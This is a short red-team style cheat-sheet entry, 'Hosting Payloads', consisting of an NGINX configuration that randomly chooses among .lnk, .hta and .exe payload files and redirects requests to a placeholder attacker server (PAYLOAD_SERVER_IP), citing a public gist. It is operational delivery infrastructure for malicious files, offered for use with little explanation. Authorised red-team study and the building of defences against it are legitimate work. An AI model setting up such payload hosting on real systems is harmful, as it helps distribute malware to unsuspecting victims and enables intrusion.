# Hosting Payloads

```
# Serving Random Payloads with NGINX
# add set_random module https://github.com/openresty/set-misc-nginx-module#set_random
# edit file /etc/nginx/sites-enabled/default

set_random $uri 1 3;

map $uri $payloads {
    1 /payload.lnk;
    2 /payload.hta;
    3 /payload.exe;
}

server {
        listen 80 default_server;
        listen [::]:80 default_server;

        server_name _;

        root /var/www;

        index index.html;

        location ^/payload/?$ {
            rewrite ^/payload/?$ /$payloads redirect;
        }

        location ^/payload\.(exe|lnk|hta) {
            rewrite ^/payload\.(exe|lnk|hta) http://PAYLOAD_SERVER_IP$request_uri redirect;
        }

        location / {
                try_files $uri $uri/ =404;
        }
}
```

---
## References

- [jivoi: Serving Random Payloads with NGINX](https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9)